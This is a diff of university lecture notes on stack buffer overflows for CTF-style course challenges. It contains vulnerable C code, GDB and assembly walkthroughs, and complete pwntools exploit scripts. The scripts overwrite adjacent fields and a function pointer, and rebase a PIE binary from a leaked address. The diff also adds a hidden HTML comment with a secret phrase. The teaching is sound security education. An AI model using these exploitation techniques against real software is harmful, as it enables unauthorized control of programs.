@@ -1,5 +1,5 @@
 ---
-title: "Lecture Notes: Basics of Buffer Overflows"
+title: "Lecture Notes: Basics of Buffer Overflows (CS557)"
 date: 2020-01-01 02:00:00
 categories: notes lecture
 layout: post
@@ -20,31 +20,17 @@ Why keep using the same bug? Because the buffer overflow itself is not the hard 
 
 The targets will gradually become more interesting. Roughly speaking, we will progress from
 
-1. changing an integer to *anything other than zero*,
+1. changing an integer while preserving adjacent integrity-critical state,
 2. changing an integer to an *exact value*, and
 3. changing a **function pointer**, which lets us begin manipulating the program's control flow.
 
 Later, we will take another step and target a particularly important code pointer: the **saved return address**. But we have a fair amount of groundwork to cover before we get there.
 
-## Course-specific objectives and solver paths
+## Course objectives and solver path
 
-Both courses use fixed, Docker-built x86-64 binaries so a shell-server upgrade
+These challenges use fixed, Docker-built x86-64 binaries so a shell-server upgrade
 does not silently change offsets, symbols, libc behavior, or mitigations. Docker
 is only the authoring environment; these are not Docker runtime challenges.
-
-The CS4401 path emphasizes a clear progression:
-
-1. `stack0r-64`: identify unsafe input and corrupt adjacent stack data.
-2. `stack0r-guessdown`: transfer that model to a remote, binary-withheld,
-   runtime-sized layout using `remote()` and a tolerant packed payload.
-3. `stack1r-64`: measure an exact offset, encode `MODE` with `p32()`, and use
-   an environment variable as process input.
-4. `stack2r-64`: overwrite a function pointer in a non-PIE binary using a
-   stable address.
-5. Complete the Ghidra Fundamentals mini-lab, then solve
-   `stack2r-warp-drive` from an unstripped binary without source.
-
-The CS557 path adds a second layer of reasoning:
 
 1. `stack0g-64`: change the target while preserving the adjacent integrity
    field.
@@ -54,16 +40,31 @@ The CS557 path adds a second layer of reasoning:
    Python bytes, and C strings; construct the newline-containing value directly
    in pwntools.
 4. `stack2g-64`: distinguish ELF offsets from runtime addresses, recover a
-   PIE base from a leak, and derive the winning function in the same process.
+   PIE base from a leak, and derive the recalibration function in the same
+   process.
 5. Complete the Ghidra Fundamentals mini-lab, then independently recover and
    exploit `stack2g-warp-drive` under ASLR.
 
-In both tracks, the expected deliverable is a repeatable Python exploit script,
-not a one-off terminal command.
+The expected deliverable is a repeatable Python exploit script, not a one-off
+terminal command.
+
+<!-- The crew manifest says nobody is in this panel. The manifest is wrong.
+You looked somewhere you were supposed to look, so take this before they notice:
+DoTheRequiredReading -->
 
 ## Getting Started with `stack0`
 
-Consider the basic structure of the first CS4401 challenge:
+### Lecture concept map
+
+* attacker-controlled standard input and an oversized `read()`
+* stack objects and explicit structure layout
+* overwrite direction and measured offsets
+* bounded corruption and preserved integrity-critical state
+* raw memory inspection with GDB/GEF
+* `p32()`, `flat()`, and exact payload length
+* `send()` versus `sendline()`
+
+Consider the basic structure of the first CS557 challenge:
 
 ```c
 #include <stdint.h>
@@ -72,13 +73,18 @@ Consider the basic structure of the first CS4401 challenge:
 struct security_console {
     char input[64];
     volatile uint32_t security_mode;
+    volatile uint32_t integrity;
 };
 
 int main(void) {
-    struct security_console console = {{0}, 0};
+    struct security_console console = {
+        .input = {0},
+        .security_mode = 0,
+        .integrity = 0x434c4157
+    };
 
     read(STDIN_FILENO, console.input, sizeof(console));
-    if (console.security_mode != 0) {
+    if (console.security_mode != 0 && console.integrity == 0x434c4157) {
         /* print the flag */
     }
 }
@@ -86,7 +92,7 @@ int main(void) {
 
 Our goal is to convince this program to print the contents of `flag.txt`.
 
-There is an obvious problem: `security_mode` starts at zero, the program never assigns another value to it, and the flag is only printed if `security_mode != 0`.
+There is an obvious problem: `security_mode` starts at zero, the program never assigns another value to it, and the flag is only printed if `security_mode != 0`. At the same time, the adjacent `integrity` field must retain its original value.
 
 Under the program's intended execution, we lose.
 
@@ -96,17 +102,18 @@ Fortunately, this is a binary exploitation course. We are not limiting ourselves
 
 For our purposes, **exploiting a binary** means taking advantage of some flaw in a program to make the program behave in a way that its programmer did not intend.
 
-For `stack0`, our intended behavior is particularly simple:
+For `stack0g-64`, the relevant intended behavior is:
 
 ```c
 security_mode = 0;
+integrity = 0x434c4157;
 ...
-if (security_mode != 0) {
+if (security_mode != 0 && integrity == 0x434c4157) {
     ...
 }
 ```
 
-The programmer clearly expects `security_mode` to remain zero. Our job is to make that assumption false.
+The programmer clearly expects `security_mode` to remain zero. Our job is to make that assumption false without violating the integrity check. This is a small but important distinction: successful corruption is not necessarily unlimited corruption.
 
 That gives us a useful way to think about an exploit. We generally need at least two things:
 
@@ -149,8 +156,10 @@ For now, though, this oversized `read()` gives us exactly the interface we need.
 ## The Bug: A Size Mismatch
 
 The destination is the 64-byte `input` member, but the requested read length is
-the size of the entire structure. That explicitly permits bytes to cross from
-the input buffer into the adjacent security field.
+the 72-byte size of the entire structure. That explicitly permits bytes to cross
+from the input buffer into both adjacent fields. The bug gives us permission to
+write too much; the integrity check gives us a reason to stop after exactly 68
+bytes.
 
 The infamously unsafe `gets()` function illustrates the same underlying lesson
 and still appears in older examples and other challenge code. Its interface is
@@ -248,7 +257,7 @@ p.sendline(b'a' * 133)
 
 These sorts of one-byte details matter. Being off by one byte is very often the difference between "exploit works" and "exploit crashes."
 
-The current Stack 0 variants use `read()` and do not append this terminator.
+The current Stack 0 challenge uses `read()` and does not append this terminator.
 The detail still matters for functions that create C strings, including the
 `strcpy()` path in Stack 1.
 
@@ -286,15 +295,19 @@ Different parts of the virtual address space are used for different purposes. Fo
 
 We will spend plenty of time on all three.
 
-For `stack0`, the important one is the stack because both of these are local variables:
+For `stack0`, the important one is the stack because this structure is a local variable:
 
 ```c
-struct security_console console = {{0}, 0};
+struct security_console console = {
+    .input = {0},
+    .security_mode = 0,
+    .integrity = 0x434c4157
+};
 ```
 
 Local variables normally live in the function's **stack frame**.
 
-We will give stack frames a much more careful treatment when we get to return addresses. For now, we mostly care that `console.input` and `console.security_mode` are both sitting in one structure in stack memory.
+We will give stack frames a much more careful treatment when we get to return addresses. For now, we mostly care that `console.input`, `console.security_mode`, and `console.integrity` are sitting in one structure in stack memory.
 
 ## Exploiting `stack0`
 
@@ -304,44 +317,46 @@ The oversized `read()` starts writing at the beginning of `console.input` and
 continues toward higher addresses.
 
 Because C preserves structure-member order, `console.security_mode` follows the
-input array. A sufficiently long input runs off the end of the array and begins
-overwriting that field.
+input array, followed by `console.integrity`. A sufficiently long input runs off
+the end of the array and begins overwriting those fields.
 
 Conceptually, perhaps memory looks like this:
 
 ```text
 ◄──────────────── Lower addresses       Higher addresses ────────────────►
 
-+-------------------------------+----------------+
-|         console.input         | security_mode  |
-+-------------------------------+----------------+
++-------------------------------+---------------+-----------+
+|         console.input         | security_mode | integrity |
++-------------------------------+---------------+-----------+
 ^
 read() starts writing here ──────────────────────►
 ```
 
-If we keep writing long enough:
+If we write 64 bytes of padding followed by one packed 32-bit value:
 
 ```text
-+-------------------------------+----------------+
-| A A A A A A A A A A A A A A | A A A A        |
-+-------------------------------+----------------+
-                                  ^
-                                  security_mode is no longer zero
++-------------------------------+---------------+-----------+
+| A A A A A A A A A A A A A A | 01 00 00 00   | 57 41 ... |
++-------------------------------+---------------+-----------+
+                                  ^               ^
+                                  changed         preserved
 ```
 
 And suddenly:
 
 ```c
-if (console.security_mode != 0)
+if (console.security_mode != 0 && console.integrity == 0x434c4157)
 ```
 
 is true.
 
-That is our first exploit.
+That is our first exploit. The useful payload ends immediately after the
+four-byte `security_mode` value. Additional bytes would begin corrupting the
+integrity field and turn a successful overwrite into a failed repair.
 
 The attack itself is simple:
 
-> **Use a buffer overflow to change some adjacent piece of memory to a value that is useful to us.**
+> **Use a buffer overflow to change useful adjacent state while preserving the state the program still verifies.**
 
 That basic description will continue to apply to the next few challenges. We will just keep choosing more interesting things to overwrite.
 
@@ -465,11 +480,13 @@ context.binary = elf
 context.log_level = 'debug'
 
 p = gdb.debug(elf.path, cwd='./challenge', gdbscript='''
-    break source.c:30
+    break source.c:37
     continue
 ''')
 
-p.send(flat({64: p32(1)}))
+payload = flat({64: p32(1)})
+assert len(payload) == 68
+p.send(payload)
 
 p.recvall()
 p.wait()
@@ -507,6 +524,10 @@ and
 ```
 
 matters.
+
+The explicit length check matters in the graduate challenge. `send()` transmits
+exactly the bytes in `payload`; `sendline()` would append a newline and begin
+overwriting the integrity field.
 
 Finally:
 
@@ -573,7 +594,7 @@ Eventually we also need to become comfortable answering questions from the machi
 For example, imagine we see something like this near the call to `read()`:
 
 ```asm
-mov    edx,0x44
+mov    edx,0x48
 lea    rax,[rbp-0x50]
 mov    rsi,rax
 mov    edi,0x0
@@ -590,7 +611,7 @@ Therefore, immediately before the call:
 ```text
 RDI = 0 (standard input)
 RSI = address of console.input
-RDX = 68 bytes
+RDX = 72 bytes
 ```
 
 That is incredibly useful.
@@ -617,7 +638,17 @@ You do, however, need to understand the instructions that matter to your attack.
 
 ## `stack1`: Exact Values and Endianness
 
-In `stack0`, life is easy.
+### Lecture concept map
+
+* environment variables as process input
+* `getenv()`, `strcpy()`, and C-string boundaries
+* exact overwrites instead of merely nonzero values
+* 32-bit integers, little endian, and `p32()`
+* Python `bytes` versus text
+* shell, environment, Python, and C data boundaries
+* direct pwntools `env` construction and byte verification
+
+In `stack0`, the target value itself is flexible.
 
 We do not particularly care what value we place in `security_mode`. We only need:
 
@@ -625,20 +656,13 @@ We do not particularly care what value we place in `security_mode`. We only need
 security_mode != 0
 ```
 
-So one `a` byte is perfectly adequate:
+Any nonzero 32-bit value is acceptable as long as the following integrity field
+survives. Stack 1 makes the value itself exact.
 
-```text
-0x61
-```
-
-The next challenge makes things more interesting.
-
-Instead of changing an integer to *anything other than zero*, Stack 1 requires
-an exact value. CS4401 uses `0x45444f4d`, whose packed bytes spell `MODE`;
-CS557 uses the newline-containing `0x0d0a0d0a` value:
+The CS557 challenge uses the newline-containing `0x0d0a0d0a` value:
 
 ```c
-if (modified == 0x0d0a0d0a) {
+if (console.debug_password == 0x0d0a0d0a) {
     ...
 }
 ```
@@ -754,6 +778,19 @@ instead of manually constructing an error-prone sequence of escaped bytes.
 
 `stack1` also provides a useful reminder that stdin is not the only way to control a process.
 
+The challenge obtains `DEBUG` from the process environment and then copies it
+without checking its length:
+
+```c
+const char *debug = getenv("DEBUG");
+strcpy(console.input, debug);
+```
+
+Environment values reach C as null-terminated byte strings. `strcpy()` copies
+those bytes, followed by a null terminator, until it encounters the end of the
+source string. Environment values therefore cannot contain an embedded null
+byte, but they can contain line-feed and carriage-return bytes.
+
 If the vulnerable program reads from an environment variable, pwntools can set that environment for us:
 
 ```python
@@ -762,12 +799,31 @@ from pwn import *
 p = process(
     './stack1-64',
     env={
-        "DEBUG": b"a" * 64 + p32(0x0d0a0d0a)
+        b"DEBUG": b"a" * 64 + p32(0x0d0a0d0a)
     }
 )
 
 p.interactive()
 ```
+
+This direct byte-valued mapping is the intended and most dependable approach.
+It passes the payload to the child process without asking a shell to parse or
+store it first.
+
+Be precise about what the shell does, however. Shell command substitution strips
+**trailing** newline bytes. The packed value in this challenge is:
+
+```python
+p32(0x0d0a0d0a) == b'\x0a\x0d\x0a\x0d'
+```
+
+Because this particular sequence ends in a carriage return, carefully quoted
+command substitution can preserve it. That does not make the shell a good
+general-purpose binary transport. A payload that ends in a newline would be
+changed, shell quoting and substitution rules remain context dependent, and
+embedded null bytes cannot pass through either an environment variable or a C
+string. Build and inspect the bytes in the exploit script so that each boundary
+is explicit.
 
 Again, the high-level question is:
 
@@ -776,6 +832,17 @@ Again, the high-level question is:
 That question generalizes much better than memorizing a particular exploit string.
 
 ## `stack2`: From Data Corruption to Control-Flow Hijacking
+
+### Lecture concept map
+
+* function pointers, code pointers, indirect calls, and `rip`
+* 64-bit pointers and `p64()`
+* `file`, `checksec`, and ELF defenses
+* PIE, ASLR, ELF-relative offsets, and runtime addresses
+* parsing an information leak from the running process
+* `PIE base = runtime leak - ELF symbol offset`
+* rebasing a pwntools `ELF` and deriving `recalibration`
+* using the leak and overwrite in the same process
 
 So far, our target has been an integer.
 
@@ -794,7 +861,7 @@ void (*fp)();
 might eventually contain the address of:
 
 ```c
-win()
+recalibration()
 ```
 
 and the program can then indirectly call the function through `fp`.
@@ -836,19 +903,19 @@ That gives us **control-flow hijacking**.
 Suppose the program intends to call:
 
 ```text
-normal_function
+diagnostics
 ```
 
 but we corrupt a function pointer so that it instead points to:
 
 ```text
-win
+recalibration
 ```
 
 Then the indirect call eventually causes:
 
 ```text
-RIP = address of win
+RIP = address of recalibration
 ```
 
 We have changed the program's control flow.
@@ -859,18 +926,19 @@ And it is the basic idea behind many of the attacks we will study for the rest o
 
 ## Finding the Target Address
 
-To overwrite a function pointer with the address of `win`, we first need to know the address of `win`.
+To overwrite the function pointer with the address of `recalibration`, we first
+need to know the runtime address of `recalibration`.
 
 If the address is fixed, GDB may make this very easy:
 
 ```gdb
-p &win
+p &recalibration
 ```
 
 or:
 
 ```gdb
-info address win
+info address recalibration
 ```
 
 But before blindly copying an address into an exploit, we should ask another question:
@@ -929,10 +997,10 @@ If PIE is disabled, the program's executable code normally remains at fixed addr
 If PIE is enabled, addresses shown by static-analysis tools can instead look like small offsets:
 
 ```text
-win = 0x7aa
+recalibration = 0x7aa
 ```
 
-That does **not** necessarily mean that `win()` is really executing at virtual address `0x7aa`.
+That does **not** necessarily mean that `recalibration()` is really executing at virtual address `0x7aa`.
 
 Once the process is running, you might instead find something like:
 
@@ -948,11 +1016,10 @@ base + 0x7aa
 
 That is a consequence of the coarse-grained randomization we will discuss in our ASLR notes.
 
-CS4401 Stack 2 is non-PIE, so students first practice the function-pointer
-overwrite with a stable target address. CS557 Stack 2 provides an
-**information leak** from the current process. Once we have one known address
-in that executable, fixed symbol offsets let us calculate the PIE base and the
-runtime address we actually want.
+`stack2g-64` provides the runtime address of `diagnostics` as an **information
+leak** from the current process. Once we have one known runtime address from the
+executable, fixed symbol offsets let us calculate the PIE base and the runtime
+address of `recalibration`.
 
 The important point for now is not to memorize an ASLR bypass.
 
@@ -962,34 +1029,38 @@ It is to start asking:
 
 ## Developing the Exploit Systematically
 
-By this point, a basic exploit might have a structure like:
+The graduate challenge gives us everything needed to perform that calculation
+in a repeatable exploit:
 
 ```python
-from pwn import *
+from pwn import ELF, context, flat, p64, process
 
-elf = ELF('./stack2-64')
-context.binary = elf
-context.log_level = 'debug'
+context.binary = elf = ELF('./stack2-64')
+diagnostics_offset = elf.symbols['diagnostics']
 
-p = gdb.debug('./stack2-64', gdbscript='''
-    break main
-    continue
-''')
+p = process(elf.path)
+p.recvuntil(b'Diagnostic beacon: ')
+diagnostics_runtime = int(p.recvline().strip(), 16)
 
-offset = ...
-target = ...
+pie_base = diagnostics_runtime - diagnostics_offset
+assert pie_base & 0xfff == 0
+elf.address = pie_base
 
-payload = flat({
-    offset: target
-})
-
-p.sendline(payload)
-p.interactive()
+recalibration_runtime = elf.symbols['recalibration']
+payload = flat({64: p64(recalibration_runtime)})
+p.send(payload)
+print(p.recvall().decode(errors='replace'))
 ```
 
-The `...` values are not numbers that we should fill in through inspired guessing.
+Save the static `diagnostics` offset before assigning `elf.address`. Once the
+pwntools ELF object is rebased, symbol lookups return runtime addresses. The
+page-alignment assertion is a useful sanity check: executable mappings begin on
+page boundaries, so a correctly recovered base should end in three zero
+hexadecimal digits.
 
-They are questions that we answer.
+Most importantly, do not let the process that produced the leak exit before you
+send the overwrite. A new execution receives a new PIE base under ASLR. The
+leak and the derived target are valid for the process that emitted that leak.
 
 ### Question 1: What is the offset?
 
@@ -1090,23 +1161,23 @@ Suppose your exploit lives here:
 and the real challenge is here:
 
 ```text
-/problems/stack2r-64/
+/problems/stack2g-64_INSTANCE_ID/
 ```
 
 You can do:
 
 ```bash
-cd /problems/stack2r-64/
+cd /problems/stack2g-64_INSTANCE_ID/
 python3 ~/exploits/stack2.py
 ```
 
 If the script opens:
 
 ```python
-ELF('./stack2r-64')
+ELF('./stack2-64')
 ```
 
-then `./stack2r-64` is resolved relative to the **current working directory**, not relative to the directory containing your Python script.
+then `./stack2-64` is resolved relative to the **current working directory**, not relative to the directory containing your Python script.
 
 This becomes even more important later because the execution environment can affect memory layout, especially addresses on the stack.
 
@@ -1206,22 +1277,22 @@ Changing `72` to `73` because "maybe that works" generally does not.
 
 This note is most directly useful for:
 
-* `stack0r-64` / `stack0g-64`: adjacent data corruption, with the graduate
-  variant requiring preservation of a neighboring integrity field.
-* `stack1r-64` / `stack1g-64`: exact environment-variable overwrites, with
-  the graduate variant adding binary-data transformation diagnosis.
-* `stack2r-64` / `stack2g-64`: function-pointer control-flow hijacking,
-  first with a stable non-PIE address and then with leak-assisted PIE rebasing.
+* `stack0g-64`: bounded adjacent-data corruption that preserves a neighboring
+  integrity field.
+* `stack1g-64`: an exact environment-variable overwrite built from explicit
+  bytes.
+* `stack2g-64`: function-pointer control-flow hijacking with leak-assisted PIE
+  rebasing.
 
 It also sets up:
 
-* `stack0r-guessdown` / `stack0g-guessdown`: the same early questions in a
-  remote black-box setting with a runtime-sized layout and timeout.
-* `stack2r-warp-drive` / `stack2g-warp-drive`: source-withheld Ghidra
-  analysis followed by either a stable non-PIE target or leak-assisted PIE
-  rebasing.
+* `stack0g-guessdown`: the same early questions in a remote black-box setting
+  with a runtime-sized layout and timeout.
+* `stack2g-warp-drive`: source-withheld Ghidra analysis followed by
+  leak-assisted PIE rebasing.
 
-The next set of notes on stack frames and return addresses will pick up with `stack3r-64`.
+The next set of notes on stack frames and return addresses will continue with
+the saved-return-address challenges after that sequence has been updated.
 
 ## What Comes Next?
 
